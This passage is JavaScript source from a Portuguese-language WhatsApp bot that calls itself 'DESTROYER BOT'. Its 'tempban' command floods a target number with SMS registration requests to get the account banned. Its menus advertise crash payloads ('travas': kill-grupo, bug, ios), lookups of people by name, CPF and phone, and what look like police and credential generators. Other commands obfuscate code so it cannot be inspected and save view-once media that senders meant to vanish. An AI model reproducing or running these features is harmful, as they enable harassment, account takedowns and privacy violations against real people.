	if (!m.quoted) return reply(`*Selecione uma mensagem em visualização única!*`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return reply(`*Isso não é uma mensagem em visalização única!*`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return uwu.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return uwu.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break

case "tagall": {
  if (!m.isGroup) return reply(mess.grp)
  if (!isAdmins) return reply(mess.admin)
  // if (!text) return reply(`Coloque alggo`)
  let teks = "DESTROYER BOT TE CONVOCOU!\n"
  let member = await participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
  await member.forEach((e) => {
      teks += `@${e.split("@")[0]}\n`
  })
  await uwu.sendMessage(m.chat, {
      text: teks,
      mentions: [...member]
  }, {
      quoted: m
  })
}
break

case 'randfigu': {
  // if (!isCreator) return reply(mess.prem);

  try {
    const axios = require('axios');
    const url = 'https://pnsapis.online/api/figurinhas?apitoken=Verykibes%20Channel2025ofc';

    const response = await axios.get(url, { responseType: 'arraybuffer' });

    const buffer = Buffer.from(response.data, 'binary');

    await uwu.sendMessage(from, {
      sticker: buffer
    }, { quoted: m });

  } catch (err) {
    console.error(err);
    return reply('❌ Ocorreu um erro ao buscar a figurinha aleatória.');
  }
}
break;

case 'menu': {

    const caption = `
╭━━⧫    ⌤   ⧫━━╮
┃ 🤖 Bot: *Privado*
┃ 👤 Nome: *${global.botname}*
┃ 🛠 Versão: *${global.botversion}*
┃ 👨‍💻 Criado por: *${global.ownername}*
┃ ⏳ Tempo ativo: *${runtime(process.uptime())}*
╰━━━━━━━━━━━━━╯

Escolha um dos menus:
╭━〔     ⌤    〕━╮
┃ •  ${prefix}travas
┃ •  ${prefix}consultas
┃ •  ${prefix}geradores
┃ •  ${prefix}geral
┃ •  ${prefix}grupo
┃ •  ${prefix}alugarbot
╰━━━━━━━━━━━━━╯
`.trim()

  await uwu.sendMessage(m.chat, {
    image: fs.readFileSync('./luckzMedia/thumb.jpg'),
    caption,
    mentions: [m.sender],
    footer: `${global.botname} - ${global.botversion}`,
    headerType: 6
  }, { quoted: m });
}
break;

case 'travas': {
  const caption = `
╭━〔 *𝓣𝓡𝓐𝓥𝓐𝓢* 〕━╮
┃ • ☠️ null
┃ • 🏠 kill-grupo
┃ • 🚀 bug
┃ • 📍 location
┃ • 🔕 kill-notify
┃ • 🕒 atraso
┃ • 🕒 atrasostatus
┃ • 📡 protocolbug
┃ • ✉️ convite
┃ • 🍎 ios
┃ • 🎉 closeuiteste
╰━━━━━━━━━━━━━╯
`.trim();

  await uwu.sendMessage(m.chat, {
    image: fs.readFileSync('./luckzMedia/thumb.jpg'),
    caption,
    mentions: [m.sender],
    footer: `${global.botname} - ${global.botversion}`,
    headerType: 6
  }, { quoted: m });
}
break;

case 'grupo': {
  const caption = `
╭━〔 *𝓖𝓡𝓤𝓟𝓞* 〕━╮
┃ • 🔗antilink
┃ • 📎antidoc
┃ • 🏷️tagall
┃ • 🎵play
┃ • 🔨ban
┃ • 💌correio
┃ • 🔔totag
┃ • 👋bemvindo
┃ • 💑namorar
┃ • ❌cancelarpedido
┃ • 🤝dupla
┃ • 💔terminar_namoro
╰━━━━━━━━━━━━━╯
`.trim();

  await uwu.sendMessage(m.chat, {
    image: fs.readFileSync('./luckzMedia/thumb.jpg'),
    caption,
    mentions: [m.sender],
    footer: `${global.botname} - ${global.botversion}`,
    headerType: 6
  }, { quoted: m });
}
break;

// Menu CONSULTAS
case 'consultas': {
  const caption = `
╭━〔 *𝓒𝓞𝓝𝓢𝓤𝓛𝓣𝓐𝓢* 〕━╮
┃ • 👤 nome
┃ • 👤 nome2
┃ • 🪪 cpf
┃ • 🪪 cpf2
┃ • 📱 tel
┃ • 📱 tel2
╰━━━━━━━━━━━━━╯
`.trim();

  await uwu.sendMessage(m.chat, {
    image: fs.readFileSync('./luckzMedia/thumb.jpg'),
    caption,
    mentions: [m.sender],
    footer: `${global.botname} - ${global.botversion}`,
    headerType: 6
  }, { quoted: m });
}
break;

// Menu GERADORES
case 'geradores': {
  const caption = `
╭━〔 *𝓖𝓔ℛ𝓐𝓓𝓞ℛ𝓔𝓢* 〕━╮
┃ • 🚓 pmrj
┃ • 💉 sppni
┃ • 🔐 credlink
╰━━━━━━━━━━━━━╯
`.trim();

  await uwu.sendMessage(m.chat, {
    image: fs.readFileSync('./luckzMedia/thumb.jpg'),
    caption,
    mentions: [m.sender],
    footer: `${global.botname} - ${global.botversion}`,
    headerType: 6
  }, { quoted: m });
}
break;

// Menu GERAIS
case 'geral': {
  const caption = `
╭━〔 *𝓖𝓔𝓡𝓐𝓛* 〕━╮
┃ • 🧹 clearchat
┃ • 📷 verfoto
┃ • ⏳ tempban
┃ • 📝 nick
┃ • 🌐 gethtml
┃ • ☢️ nuke
┃ • 🖼️ plaq1-8
┃ • 🤖 randfigu
┃ • 🔐 criptografar
╰━━━━━━━━━━━━━╯
`.trim();

  await uwu.sendMessage(m.chat, {
    image: fs.readFileSync('./luckzMedia/thumb.jpg'),
    caption,
    mentions: [m.sender],
    footer: `${global.botname} - ${global.botversion}`,
    headerType: 6
  }, { quoted: m });
}
break;

case 'dec': case 'decrypt': {
	if (isCreator) {
const { webcrack } = await import('webcrack');
const usage = `Usage Example:
${prefix + command} (Input text or reply text to dec code)
${prefix + command} doc (Reply to a document)`;

let text;
if (args.length >= 1) {
text = args.join(" ");
} else if (m.quoted && m.quoted.text) {
text = m.quoted.text;
} else {
return reply(usage);
}

try {
let message;
if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
let docBuffer;
if (m.quoted.mimetype) {
docBuffer = await m.quoted.download();
}
message = await webcrack(docBuffer.toString('utf-8'));
} else {
message = await webcrack(text);
}

const filePath = './dec_by_@luckzinios.js';
fs.writeFileSync(filePath, message.code);

await uwu.sendMessage(m.chat, {
document: {
url: filePath
},
mimetype: 'application/javascript',
fileName: 'Decrypted By @luckzinios'
}, {quoted: m});

} catch (error) {
const errorMessage = `There is an error: ${error.message}`;
await reply(errorMessage);
}
} else {
    	return
    }
}
break;

case 'criptografar': {
    if (!isCreator) return reply(mess.prem)
    const JSConfuser = require("js-confuser");

    let text;
    if (args.length >= 1) {
        text = args.join(" ");
    } else if (m.quoted && m.quoted.text) {
        text = m.quoted.text;
    } else {
        return
    }

    try {
        let code;
        if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
            let docBuffer;
            if (m.quoted.mimetype) {
                docBuffer = await m.quoted.download();
            }
            code = docBuffer.toString('utf-8');
        } else {
            code = text;
        }

        const optionsObf6 = {
            target: "node",
            preset: "high",
            compact: true,
            minify: true,
            flatten: true,

            identifierGenerator: function() {
                const originalString =
                    "素晴座素晴難LUCKZIN素晴座素晴難" +
                    "素晴座素晴難LUCKZIN素晴座素晴難";

                function removeUnwantedChars(input) {
                    return input.replace(
                        /[^a-zA-Z座Nandokuka素Muzukashī素晴]/g, ''
                    );
                }

                function randomString(length) {
                    let result = '';
                    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
                    const charactersLength = characters.length;

                    for (let i = 0; i < length; i++) {
                        result += characters.charAt(
                            Math.floor(Math.random() * charactersLength)
                        );
                    }
                    return result;
                }

                return removeUnwantedChars(originalString) + randomString(2);
            },

            renameVariables: true,
            renameGlobals: true,

            stringEncoding: true,
            stringSplitting: 0.0,
            stringConcealing: true,
            stringCompression: true,
            duplicateLiteralsRemoval: 1.0,

            shuffle: {
                hash: 0.0,
                true: 0.0
            },

            stack: true,
            controlFlowFlattening: 1.0,
            opaquePredicates: 0.9,
            deadCode: 0.0,
            dispatcher: true,
            rgf: true,
            calculator: true,
            hexadecimalNumbers: true,
            movedDeclarations: true,
            objectExtraction: true,
            globalConcealing: true
        };

        const options = {
            target: "node",
            calculator: true,
            compact: true,
            hexadecimalNumbers: true,
            controlFlowFlattening: 0.5,
            deadCode: 0.25,
            dispatcher: true,
            duplicateLiteralsRemoval: 0.75,
            flatten: true,
            globalConcealing: true,
            minify: true,
            movedDeclarations: true,
            objectExtraction: true,
            opaquePredicates: 0.75,
            renameVariables: true,
            renameGlobals: true,
            shuffle: true,
            stringConcealing: true,
            stringCompression: true,
            stringEncoding: true,
            stringSplitting: 0.75,
            preserveFunctionLength: true,
            identifierGenerator: function() {
                return "luckzin_o_melhorzin" + Math.random().toString(36).substring(7);
            },
        };

        const obfuscatedCode = await JSConfuser.obfuscate(code, optionsObf6, options);

        const filePath = './enc_by_@luckzinios.js';
        fs.writeFileSync(filePath, obfuscatedCode);

        await uwu.sendMessage(m.chat, {
            document: {
                url: filePath
            },
            mimetype: 'application/javascript',
            fileName: 'Encrypted By @luckzinios.js'
        }, {
            quoted: m
        });

    } catch (error) {
        const errorMessage = `There is an error: ${error.message}`;
        await reply(errorMessage);
    }
}
break

case 'tempban': 
{
  if(!isCreator) return reply(mess.prem)
  if(!text) return reply(`Exemplo: ${command} 489xxxxxxxx`)

    const alvo = `${text.replace(/[^0-9]/g,'')}`
    await reply(`Dando ban no ${alvo}. Aguarde.`)

    try{
      const {state} = await useMultiFileAuthState('./tempban')
      const spam = await makeWASocket({
        auth: state,
        mobile: true,
        logger: pino({level: 'silent'})
      })
      let tentativas = 0
      const maxTentativas = 100
      while(tentativas < moment.max) {
        try {
          const res = await spam.requestRegistrationCode({ phoneNumber: `+55${alvo}`,
            phoneNumberCountryCode: 55,
            phoneNumberNationalNumber: numero,
            phoneNumberMobileCountryCode: 724,
            method: 'sms'
          })
          tentativas++
          console.log(`${tentativas}/${maxTentativas} Tentando banir ${alvo}`)

          if(res.reason === 'temporarily_unavailable') {
            await uwu.sendMessage(m.chat, { text: `${alvo} Acabou de ser banido!`})
            break
          }
          await sleep(100)
        } catch(err) {
          console.log(`Erro na tentativa: ${tentativas}: ${err}`)
        }
      }
      if(tentativas >= maxTentativas) {
        await uwu.sendMessage(m.chat, { text: `Mandei os 100 spam! Pode acontecer de não ter banido!!`})
      }
    } catch(err) {
      await uwu.sendMessage(m.chat, { text: `Erro ao banir ${alvo}, ${err.message}`})
    }
}
  
default:
}
} catch (err) {
console.log(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})